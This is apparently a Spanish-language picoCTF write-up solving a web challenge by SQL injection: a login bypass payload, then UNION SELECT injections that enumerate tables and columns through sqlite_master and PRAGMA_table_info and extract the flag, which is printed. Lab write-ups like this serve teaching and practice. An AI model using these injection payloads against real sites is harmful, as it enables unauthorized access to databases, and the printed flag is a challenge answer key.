# RETO
# Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:62115/).
Hints:
1. SQLiLite
# Solución
- Primero hacenis una inyección en la contraseña de la siguiente forma: ' or 1 == 1;
- Una vez dentro podemos ver que hay una tabla y una opción de buscar, en ese campo hacemos nuestra siguiente inyección usando uno de los dstos que nos muestra, además inyectando null hasta encontrar el número de campos que contiene: Algiers' UNION SELECT null, null, null --
- Después buscamos que tablas existen en la base de datos: Algiers' UNION SELECT null, null, name FROM sqlite_master WHERE type='table' --
- Aquí usamos una función de SQLite llamada sqlite_master
- De esta forma sabemos de que tabla extraer los datos
- Ahora usaremos otra función de SQLite: Algiers' UNION SELECT null, null, name FROM PRAGMA_table_info('more_table') --
- Con esa función podemos ver los campos de la tabla "more_table"
- Aquí se nos muestra que hay un campo "flag" y un campo "id" y nosotros estamos interesados en el campo flag
- Por lo tanto vamos a obtener todos los registros de la columna "flag" en la tabla "more_table": Algiers' UNION SELECT null, null, flag FROM more_table --
- Y de esta forma obtenemos la bandera

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```
# Notas adicionales
# Referencias
- https://youtu.be/OLyKnDLuPLs?si=KMybuZp8_tSdWA3z